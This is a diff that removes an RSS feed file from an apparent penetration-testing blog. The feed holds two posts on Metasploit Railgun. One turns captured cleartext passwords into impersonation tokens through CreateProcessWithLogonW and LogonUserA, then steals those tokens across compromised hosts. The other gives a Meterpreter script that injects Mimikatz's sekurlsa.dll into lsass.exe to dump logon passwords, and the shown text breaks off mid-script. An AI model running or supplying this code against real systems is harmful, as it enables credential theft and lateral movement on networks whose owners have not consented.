@@ -1,457 +1,95 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>railgun on malicious.link</title>
-    <link>https://malicious.link/categories/railgun/</link>
-    <description>Recent content in railgun on malicious.link</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Tue, 31 Jul 2012 20:20:15 +0000</lastBuildDate>
-    
-        <atom:link href="https://malicious.link/categories/railgun/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>Raising Zombies in Windows: Part 1 - Passwords</title>
-      <link>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</link>
-      <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</guid>
-      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.&lt;/p&gt;
-&lt;p&gt;A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&amp;rsquo;re generally SOL.&lt;/p&gt;
-&lt;p&gt;There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;(this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN)&lt;/p&gt;
-&lt;p&gt;Another way if you don&amp;rsquo;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;
-&lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetStartupInfoW(&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lpStartupInfo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;advapi32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CreateProcessWithLogonW(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DOMAIN&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOGON_WITH_PROFILE&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;notepad.exe&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,a,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;advapi32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;LogonUserA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DOMAIN&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOGON32_LOGON_INTERACTIVE&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOGON32_PROVIDER_DEFAULT&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Integration of Mimikatz into Metasploit Stage1</title>
-      <link>https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</link>
-      <pubDate>Fri, 15 Jun 2012 14:55:55 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</guid>
-      <description>&lt;p&gt;One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.&lt;/p&gt;
-&lt;p&gt;Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&amp;rsquo;ll get there in the subsequent posts.&lt;/p&gt;
-&lt;p&gt;Ignore the do_cmd for now and I stepped through &lt;a href=&#34;https://malicious.link/blog/2011/5/30/remote-dll-injection-with-meterpreter.html&#34;&gt;remote DLL injection here&lt;/a&gt;. So the first odd lines is &lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;handle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CreateNamedPipeW(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\\\\.\\pipe\\kiwi\\mimikatz&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PIPE_ACCESS_DUPLEX&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30000&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;return&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;connectedlsass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ConnectNamedPipe(handle,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Essentially these connect to the &lt;a href=&#34;http://en.wikipedia.org/wiki/Named_pipe&#34;&gt;Named Pipe&lt;/a&gt; that the sekurlsa.dll uses to talk to the mimikatz.exe in it&amp;rsquo;s normal operation. Then we just use the windows API call &amp;ldquo;ReadFile&amp;rdquo; from there on out.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ReadFile(handle,&lt;span style=&#34;color:#ae81ff&#34;&gt;248&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;248&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;One of the draw backs to doing this all remotely is that Railgun doesn&amp;rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&amp;rsquo;ve overcome this for the initial &amp;ldquo;banner&amp;rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &amp;ldquo;ping&amp;rdquo; and &amp;ldquo;getLogonPasswords&amp;rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)&lt;/p&gt;
-&lt;p&gt;If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!&lt;/p&gt;
-&lt;p&gt;Meterpreter Script:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;do_cmd&lt;/span&gt;(handle,cmd)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ucommand &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_unicode(cmd)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sendcmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WriteFile(handle,ucommand,ucommand&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	good2go &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	newline &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	readstring &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; good2go &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# Have to pull data 1 unicode character at a time&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# this is because the pipe won&amp;#39;t write or read if&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# too much was written or read by the &amp;#34;client&amp;#34; (us)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		pull &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ReadFile(handle,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# Check to see if our end of read check is there: n000 @00&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pull&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lpBuffer&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;@00&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; newline &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			good2go &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			readstring &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; pull&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lpBuffer&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# Ready the newline var for previous check on next loop&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pull&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lpBuffer&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;n00&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			newline &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			newline &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status(readstring&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;))
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x86 Detected - Using x86 mimikatz&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;handle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CreateNamedPipeW(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\\\\.\\pipe\\kiwi\\mimikatz&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PIPE_ACCESS_DUPLEX&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30000&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;return&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Handle: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;handle&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;framework&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;threads&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;spawn(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;injectlsass&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lsass.exe&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LSASS located at PID: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;pid&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	pathtomimi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;sekurlsa.dll&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	pay &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;framework&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;payloads&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;windows/loadlibrary&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	pay&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DLL&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pathtomimi
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	pay&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;EXITFUNC&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;thread&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	raw &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pay&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;generate
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	targetprocess &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(pid, &lt;span style=&#34;color:#66d9ef&#34;&gt;PROCESS_ALL_ACCESS&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	mem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; targetprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;allocate(raw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;30024&lt;/span&gt;))
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	targetprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(mem, raw)
